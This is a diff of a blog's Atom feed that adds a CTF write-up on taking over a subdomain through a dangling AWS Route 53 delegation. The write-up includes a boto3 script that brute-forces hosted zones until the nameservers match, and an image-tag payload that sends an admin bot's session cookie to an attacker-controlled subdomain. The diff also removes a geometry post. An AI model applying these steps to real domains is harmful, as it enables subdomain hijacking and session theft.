@@ -1,4 +1,76 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-05-15T19:29:09+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">Cryptoverse CTF 2023 Writeup</title><link href="https://www.cjxol.com/posts/cryptoverse-ctf-2023-writeup/" rel="alternate" type="text/html" title="Cryptoverse CTF 2023 Writeup" /><published>2023-05-09T00:00:00+01:00</published><updated>2023-05-09T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/cryptoverse-ctf-2023-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/cryptoverse-ctf-2023-writeup/"><![CDATA[<p><em><a href="https://cryptoversectf.tk/">Cryptoverse CTF 2023</a></em><br />
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-05-15T21:18:47+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">Punk Security DevSecOps Birthday CTF Subdomain Takeover (Hard) Challenge Writeup</title><link href="https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/" rel="alternate" type="text/html" title="Punk Security DevSecOps Birthday CTF Subdomain Takeover (Hard) Challenge Writeup" /><published>2023-05-15T00:00:00+01:00</published><updated>2023-05-15T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/"><![CDATA[<p><a href="https://punksecurity.co.uk/ctf/2023/">Punk Security DevSecOps Birthday CTF</a><br />
+<a href="https://ctftime.org/event/1903">On CTFtime</a></p>
+
+<p>We did the 12-hour CTF on 4th May 2023. The CTF is unique and primarily focused on DevSecOps, including CI/CD pipelines, cloud etc. It is not in my best expertises, but we had a strong team and managed to full clear all the challenges and won the CTF.</p>
+
+<p>We were one of the only teams solved this subdomain takeover challenge. This solve involves exploiting a dangling delegation DNS record on AWS Route 53 to takeover a subdomain, thus bypass some CSP restrictions.</p>
+
+<h2 id="the-challenge-and-solve">The Challenge and Solve</h2>
+
+<p><em>The notes and screenshots were taken when different challenge instances were running, so several different challenge domains may be in the writeup below.</em></p>
+
+<h3 id="finding-the-dangling-delegation">Finding the Dangling Delegation</h3>
+
+<p>In the challenge description, it suggested to do a scan of possible subdomain takeover with <a href="https://github.com/punk-security/dnsReaper">dnsReaper</a> tool made and open sourced by Punk Security.</p>
+
+<p>After the scan, we found a dangling delegation DNS record for zone <code class="highlighter-rouge">dev.[challenge domain]</code>, as shown in the screenshot below.</p>
+
+<p><img src="/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/dnsReaper.png" alt="dnsReaper scan result" /></p>
+
+<p>I then created hosted zone on AWS Route 53 for <code class="highlighter-rouge">dev.[challenge domain]</code> and AWS will randomly assign 4 nameservers for the hosted zone. I used the following script to repeatedly create hosted zone and check the nameservers until I got at least one of the nameservers that the zone is delegated to.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">boto3</span>
+<span class="kn">import</span> <span class="nn">uuid</span>
+<span class="n">client</span> <span class="o">=</span> <span class="n">boto3</span><span class="p">.</span><span class="n">client</span><span class="p">(</span><span class="s">'route53'</span><span class="p">)</span>
+<span class="n">target_nameservers</span> <span class="o">=</span> <span class="s">'ns-423.awsdns-52.com,ns-904.awsdns-49.net,ns-1899.awsdns-45.co.uk,ns-1125.awsdns-12.org'</span>
+<span class="n">target_nameservers</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">target_nameservers</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">))</span>
+<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">'</span><span class="se">\r</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">zone</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">create_hosted_zone</span><span class="p">(</span>
+        <span class="n">Name</span><span class="o">=</span><span class="s">'dev.d9edd91f-c40.ctf.two.dr.punksecurity.cloud'</span><span class="p">,</span>
+        <span class="n">CallerReference</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="n">uuid4</span><span class="p">()),</span>
+        <span class="n">HostedZoneConfig</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">'PrivateZone'</span><span class="p">:</span> <span class="bp">False</span>
+        <span class="p">}</span>
+    <span class="p">)</span>
+    <span class="nb">id</span> <span class="o">=</span> <span class="n">zone</span><span class="p">[</span><span class="s">'HostedZone'</span><span class="p">][</span><span class="s">'Id'</span><span class="p">]</span>
+    <span class="n">nameservers</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">zone</span><span class="p">[</span><span class="s">'DelegationSet'</span><span class="p">][</span><span class="s">'NameServers'</span><span class="p">])</span>
+    <span class="c1"># print(nameservers, target_nameservers)
+</span>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">nameservers</span> <span class="o">&amp;</span> <span class="n">target_nameservers</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">break</span>
+    <span class="n">client</span><span class="p">.</span><span class="n">delete_hosted_zone</span><span class="p">(</span><span class="n">Id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>It took only just over 100 attempts to get a nameserver that the zone is delegated to.</p>
+
+<h3 id="finding-loopholes-on-the-web">Finding Loopholes on the Web</h3>
+
+<p>The web app to be exploited uses CSP to restrict the loading of external scripts. It only allows the script from the same origin. However, the session cookie is set to the domain scope of <code class="highlighter-rouge">.[challenge domain]</code>, that means when making requests to any subdomains or even sub-subdomains etc, the session cookie will be included.</p>
+
+<p><img src="/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/cookie.png" alt="Session Cookie" /></p>
+
+<p>The CSP on the web app also allows images from any origin, so we can load images from the subdomain we took over.</p>
+
+<p>With the <code class="highlighter-rouge">dev.[challenge domain]</code> zone we took over with our own AWS account, we can create a subdomain <code class="highlighter-rouge">takeover.dev.[challenge domain]</code> and point it to a web server we control.</p>
+
+<p><img src="/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/route53.png" alt="Pointing the subdomain to our server on AWS Route 53" /></p>
+
+<p>Thus, we I post a comment with the following content, the admin bot will make request to our server with the session cookie.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://takeover.dev.[challenge domain]"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/listen.png" alt="The admin bot made request to our server with session cookie" /></p>
+
+<p>With the session cookie of the admin bot, we can now make request to the web app with the session cookie and get the flag.</p>
+
+<h2 id="notes-and-findings-during-the-ctf">Notes and Findings during the CTF</h2>
+
+<p>In the <code class="highlighter-rouge">results.csv</code> outputted by dnsReaper, I noticed the link to a <a href="https://github.com/punk-security/dnsReaper/issues/122">GitHub Issue</a> discussing about some protections on AWS Route 53 against domain takeover because of dangling delegation. In that discussion, there is a link to a <a href="https://youtu.be/GGfQlPZSRk4?t=712">video demo</a> of the subdomain take over on AWS Route 53 at BSides Newcastle by <a href="https://github.com/SimonGurney">SimonGurney</a> whom is the author of dnsReaper. Despite not the best recording audio quality, the demo was very helpful to understand this exploit.</p>
+
+<p>Regarding <a href="https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/protection-from-dangling-dns.html">the protection from dangling delegation records in Route 53</a>, when the subdomain hosted zone is removed, the delegation will need to be removed and recreated to delegate the subdomain to a hosted zone. However, if a hosted zone is never created before the delegation, meaning the domain has always been dangling, the protection will not automatically protect against subdomain takeover.</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[Punk Security DevSecOps Birthday CTF On CTFtime]]></summary></entry><entry><title type="html">Cryptoverse CTF 2023 Writeup</title><link href="https://www.cjxol.com/posts/cryptoverse-ctf-2023-writeup/" rel="alternate" type="text/html" title="Cryptoverse CTF 2023 Writeup" /><published>2023-05-09T00:00:00+01:00</published><updated>2023-05-09T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/cryptoverse-ctf-2023-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/cryptoverse-ctf-2023-writeup/"><![CDATA[<p><em><a href="https://cryptoversectf.tk/">Cryptoverse CTF 2023</a></em><br />
 <em><a href="https://ctftime.org/event/1907">On CTFtime</a></em></p>
 
 <p>There are many challenges in this CTF which are great for learning yet still challenging and not trivial. Kudos to the organiser! Here are the writeups to some of the challenges my team solved.</p>
@@ -1275,35 +1347,4 @@ for input_id in input_ids:
 
 <p>Or even <code class="highlighter-rouge">ping 2130706433</code> (127.0.0.1 in dword) (<a href="https://www.youtube.com/watch?v=PT_qEhesKW8&amp;lc=Ugz5183SkhDLxzW5Mf14AaABAg.9av7AJhjNVy9aw2sVU3iaf">dono’s comment</a>) or <code class="highlighter-rouge">http://2130706433</code>.</p>
 
-<p>See <a href="https://www.youtube.com/watch?v=PT_qEhesKW8">Hussein Nasser’s YouTube video</a>.</p>]]></content><author><name></name></author><category term="continuously updated" /><summary type="html"><![CDATA[This post is being continuously updated with random things I come across.]]></summary></entry><entry><title type="html">Checking if Line and Plane Intersect</title><link href="https://www.cjxol.com/posts/line-plane-intersection/" rel="alternate" type="text/html" title="Checking if Line and Plane Intersect" /><published>2022-03-05T00:00:00+00:00</published><updated>2022-03-05T00:00:00+00:00</updated><id>https://www.cjxol.com/posts/line-plane-intersection</id><content type="html" xml:base="https://www.cjxol.com/posts/line-plane-intersection/"><![CDATA[<p>The post is compiled with information on <a href="https://en.wikipedia.org/wiki/Line%E2%80%93plane_intersection">Wikipedia page on Line-plane Interaction</a> and <a href="https://web.ma.utexas.edu/users/m408m/Display12-5-4.shtml">this notes on finding the normal to a plane</a>.</p>
-
-<h2 id="what-is-the-question">What is the question?</h2>
-
-<p>This post is about checking if a line intersect with a plane, given 2 different coordinates on the line and 3 different coordinates on the plane.</p>
-
-<h2 id="how-to-solve-it">How to solve it?</h2>
-
-<p>Suppose having a line with coordinates <script type="math/tex">\mathbf{a}</script> and <script type="math/tex">\mathbf{b}</script> on the line, the vector equation representing the line with the set of <script type="math/tex">\mathbf{p}</script> consist the line is:
-\begin{equation}
-\label{eq:line}
-\mathbf{p} = \mathbf{a} + d \mathbf{(b - a)}
-\end{equation}</p>
-
-<p>Suppose having a plane with coordinates <script type="math/tex">\mathbf{e}</script>, <script type="math/tex">\mathbf{f}</script> and <script type="math/tex">\mathbf{g}</script> on the plane, then the normal to the plane is <script type="math/tex">\mathbf{n = (f - e) \times (g - e)}</script>. If <script type="math/tex">\mathbf{p_0}</script> is a point on the plane (e.g. <script type="math/tex">\mathbf{p_0}</script> can be <script type="math/tex">\mathbf{e}</script>, <script type="math/tex">\mathbf{f}</script> or <script type="math/tex">\mathbf{g}</script>), the plane can be expressed as the set of points <script type="math/tex">\mathbf{p}</script> for which:
-\begin{equation}
-\label{eq:plane}
-\mathbf{(p - p_0) \cdot n} = 0
-\end{equation}</p>
-
-<p>The point(s) where the line and the plane intersect, the points have the same coordinates. Substitute \eqref{eq:line} into \eqref{eq:plane}:</p>
-
-<script type="math/tex; mode=display">% <![CDATA[
-\begin{align*}
-((\mathbf{a} + d \mathbf{(b - a)}) - \mathbf{p_0}) \cdot \mathbf{n} &= 0\\
-d \mathbf{(b - a)} \cdot \mathbf{n} + \mathbf{(a - p_0)} \cdot \mathbf{n} &= 0\\
-d &= \frac{\mathbf{(p_0 - a)} \cdot \mathbf{n}}{\mathbf{(b - a)} \cdot \mathbf{n}}
-\end{align*} %]]></script>
-
-<p>If <script type="math/tex">\mathbf{(b - a)} \cdot \mathbf{n} = 0</script> then the line and the plane are parallel. In this case, if <script type="math/tex">\mathbf{(p_0 - a)} \cdot \mathbf{n} = 0</script> then the line is on the plane. Otherwise the line and plane have no intersection.</p>
-
-<p>If <script type="math/tex">\mathbf{(b - a)} \cdot \mathbf{n} \neq 0</script> there is a single point of intersection.</p>]]></content><author><name></name></author><category term="maths" /><category term="analytic geometry" /><category term="computer graphics" /><summary type="html"><![CDATA[The post is compiled with information on Wikipedia page on Line-plane Interaction and this notes on finding the normal to a plane.]]></summary></entry></feed>
+<p>See <a href="https://www.youtube.com/watch?v=PT_qEhesKW8">Hussein Nasser’s YouTube video</a>.</p>]]></content><author><name></name></author><category term="continuously updated" /><summary type="html"><![CDATA[This post is being continuously updated with random things I come across.]]></summary></entry></feed>
